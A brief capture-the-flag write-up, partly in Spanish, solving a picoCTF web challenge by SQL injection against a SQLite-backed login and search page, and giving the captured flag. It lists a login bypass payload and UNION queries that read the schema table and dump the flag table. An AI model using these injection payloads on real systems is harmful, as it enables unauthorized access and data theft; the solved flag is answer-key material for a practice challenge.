## Descripción

Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:58600/).
## Pistas

1. SQLiLite

## Solución

1. `Datos para accesar al launch`
`admin`
`' or 1=1;`

2. `Datos dentro del search para ver los campos para buscar la tabla de la flag`
`' union select 1,2,sql from sqlite_master;`

3. `Datos para sacar los datos en la tabla de la flag`
`' union select 1,id,flag from more_table;`

`picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_62aa7500}`


## Notas Adicionales



## Referencias
- 

